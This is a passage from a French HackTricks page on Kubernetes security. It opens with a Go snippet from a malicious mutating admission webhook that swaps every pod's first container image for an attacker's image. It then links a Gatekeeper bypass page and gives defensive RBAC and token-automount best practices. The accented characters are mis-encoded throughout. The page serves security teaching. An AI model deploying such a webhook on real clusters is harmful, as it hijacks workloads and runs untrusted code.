Le script `./deploy.sh` √©tablit un contr√¥leur d'admission de webhook mutateur, qui modifie les requ√™tes √† l'API Kubernetes comme sp√©cifi√© dans ses lignes de configuration, influen√ßant les r√©sultats observ√©s :
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Le snippet ci-dessus remplace la premi√®re image de conteneur dans chaque pod par `rewanthtammana/malicious-image`.

## Contournement de l'OPA Gatekeeper

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Meilleures Pratiques

### **D√©sactivation de l'automontage des jetons de compte de service**

* **Pods et Comptes de Service** : Par d√©faut, les pods montent un jeton de compte de service. Pour am√©liorer la s√©curit√©, Kubernetes permet de d√©sactiver cette fonctionnalit√© d'automontage.
* **Comment Appliquer** : D√©finissez `automountServiceAccountToken: false` dans la configuration des comptes de service ou des pods √† partir de la version 1.6 de Kubernetes.

### **Attribution d'utilisateurs restrictifs dans les RoleBindings/ClusterRoleBindings**

* **Inclusion S√©lective** : Assurez-vous que seuls les utilisateurs n√©cessaires sont inclus dans les RoleBindings ou ClusterRoleBindings. Auditez r√©guli√®rement et retirez les utilisateurs non pertinents pour maintenir une s√©curit√© stricte.

### **R√¥les sp√©cifiques aux namespaces plut√¥t que r√¥les globaux**

* **R√¥les vs. ClusterRoles** : Pr√©f√©rez utiliser des R√¥les et des RoleBindings pour des autorisations sp√©cifiques aux namespaces plut√¥t que des ClusterRoles et des ClusterRoleBindings, qui s'appliquent √† l'√©chelle du cluster. Cette approche offre un meilleur contr√¥le et limite la port√©e des autorisations.

### **Utiliser des outils automatis√©s**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **R√©f√©rences**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
